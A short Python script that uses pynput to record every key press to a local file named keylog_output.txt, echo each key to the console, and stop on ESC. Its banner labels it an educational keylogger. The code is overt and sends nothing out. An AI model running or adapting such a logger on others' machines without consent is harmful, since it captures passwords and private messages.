from pynput import keyboard  # type: ignore

log_file = "keylog_output.txt"

def on_press(key):
    try:
        with open(log_file, "a") as file:
            file.write(f"Key pressed: {key.char}\n")
        print(f"Key pressed: {key.char}")
    except AttributeError:
        with open(log_file, "a") as file:
            file.write(f"Special key pressed: {key}\n")
        print(f"Special key pressed: {key}")

def on_release(key):
    if key == keyboard.Key.esc:
        print("Exiting logger...")
        return False  # Stop listener

print("=== Educational Keyboard Logger ===")
print("Logging keys... Press ESC to stop.\n")

with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()
